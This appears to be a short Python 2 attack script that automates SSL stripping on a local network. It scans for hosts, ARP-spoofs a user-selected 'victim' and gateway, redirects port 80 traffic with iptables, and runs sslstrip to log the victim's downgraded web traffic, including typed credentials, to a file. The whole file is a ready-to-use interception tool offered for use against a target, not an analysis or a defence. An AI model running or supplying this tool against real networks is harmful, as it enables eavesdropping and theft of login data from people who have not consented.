#!/usr/bin/python

####################
# Module:   SSL-Strip
# Author:   S.Schuster
# Date:     2015/11/11
# Version:  1.0
#
# Description: Script for automation redirect from https-Pages
# to http-Pages. With unencrypted Web-Traffic every input can 
# be sniffed.
#
###############################
# Log:
# 2015/11/11    S.S - Initial
# 2015/11/09    S.S - 
################################


import os
import subprocess

class SSLStrip:

	def start(self):
		insertEntries = True

                print "Available interfaces: "
                subprocess.call(["ls", "/sys/class/net"])

                interface = raw_input("Select interface: ")

		# enable ip-forwarding temporary
		subprocess.call(["echo",  "1 > /proc/sys/net/ipv4/ip_forward"])

		# add iptaple-rule for PREROUTING incoming traffic from victim to port 8080 (sslstrip)
		subprocess.call(["iptables",  "-t", "nat",  "-A",  "PREROUTING",  "-p", "tcp",  "--destination-port", "80",  "-j", "REDIRECT",  "--to-port",  "8080"])

		print "\n Scan hosts (LAN) ..."
                subprocess.call(["arp-scan", "--interface="+interface,  "--localnet"])

		print "\n Please enter IP-Address of victim-device for arp-spoofing"
		host = raw_input("IP-Address (Victim): ")

		print "\n Please enter Gateway-IP-Address (casual x.x.x.1)"
		gateway = raw_input("IP-Address (Gateway): ")

		print "Victim %s, Gateway %s" % (host, gateway)

		# arp-spoofing traffic from host<->gateway
		subprocess.Popen(["arpspoof", "-i", interface, "-t", host, gateway])

		# sslstrip
		subprocess.call(["sslstrip",  "-k", "-l 8080", "-w", "/root/Desktop/sslstrip.log"])

		print "\n SSL-Strip is running! \n You can find logged ssl-traffic in /root/Desktop/sslstrip.log"
		



	def help(self):
		print "HELP: ToDo"
